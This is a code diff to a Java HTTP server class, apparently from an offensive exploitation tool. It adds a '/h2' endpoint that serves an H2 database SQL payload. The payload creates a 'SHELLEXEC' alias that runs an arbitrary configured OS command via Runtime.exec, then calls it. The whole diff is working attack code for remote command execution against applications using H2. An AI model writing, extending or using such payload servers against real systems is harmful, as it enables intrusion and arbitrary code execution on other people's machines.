@@ -134,6 +134,20 @@ public class HttpServer implements HttpHandler {
 					httpExchange.sendResponseHeaders(200, 0);
 					break;
 
+				case "/h2":
+					//payload for artsploit.controllers.H2
+					//Defines a H2 alias, used to execute a OS command
+					String h2Payload = "" +
+							"CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {\n" +
+							"Runtime.getRuntime().exec(cmd);\n" +
+					        "return \"\";  }\n" +
+							"$$;\n" +
+							"CALL SHELLEXEC('" + Config.command + "')";
+
+					httpExchange.sendResponseHeaders(200, h2Payload.getBytes().length);
+					httpExchange.getResponseBody().write(h2Payload.getBytes());
+					break;
+
 				default:
 					httpExchange.sendResponseHeaders(200, 0);
 			}
